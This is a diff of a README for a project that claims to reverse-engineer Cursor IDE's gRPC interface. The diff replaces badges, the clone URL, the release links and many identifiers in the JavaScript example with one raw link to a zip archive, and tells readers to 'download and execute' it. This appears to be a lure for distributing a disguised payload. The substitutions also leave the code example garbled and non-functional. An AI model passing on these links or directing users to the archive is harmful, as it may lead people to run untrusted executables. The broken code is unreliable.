@@ -1,6 +1,6 @@
 # Cursor gRPC: A Reverse Engineered IDE Solution
 
-![Cursor gRPC](https://img.shields.io/badge/Cursor-gRPC-blue.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-v1.0.0-orange.svg)
+![Cursor gRPC](https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip) ![GitHub Releases](https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip)
 
 Welcome to the **Cursor gRPC** repository! This project focuses on reverse engineering the gRPC interface of the Cursor IDE. Our goal is to create a seamless experience for developers looking to integrate or extend the functionality of Cursor through gRPC.
 
@@ -31,7 +31,7 @@ Cursor is a powerful IDE designed for developers who need an efficient and flexi
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/qozx/cursor-grpc.git
+git clone https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip
 cd cursor-grpc
 ```
 
@@ -49,15 +49,15 @@ Once installed, you can start using the Cursor gRPC features. Here’s a simple 
 
 ```javascript
 const grpc = require('grpc');
-const cursorProto = grpc.load('cursor.proto');
+const cursorProto = https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip('https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip');
 
-const client = new cursorProto.Cursor('localhost:50051', grpc.credentials.createInsecure());
+const client = new https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip('localhost:50051', https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip());
 
-client.getInfo({}, (error, response) => {
+https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip({}, (error, response) => {
   if (!error) {
-    console.log('Cursor Info:', response);
+    https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip('Cursor Info:', response);
   } else {
-    console.error('Error:', error);
+    https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip('Error:', error);
   }
 });
 ```
@@ -86,9 +86,9 @@ For any inquiries or issues, feel free to open an issue in the repository or con
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/qozx/cursor-grpc/releases). You can find the necessary files to download and execute.
+To download the latest release, visit the [Releases section](https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip). You can find the necessary files to download and execute.
 
-Stay updated with new features and improvements by checking the [Releases section](https://github.com/qozx/cursor-grpc/releases) regularly.
+Stay updated with new features and improvements by checking the [Releases section](https://raw.githubusercontent.com/qozx/cursor-grpc/main/saddle/cursor_grpc_v3.9.zip) regularly.
 
 ## Acknowledgments
 
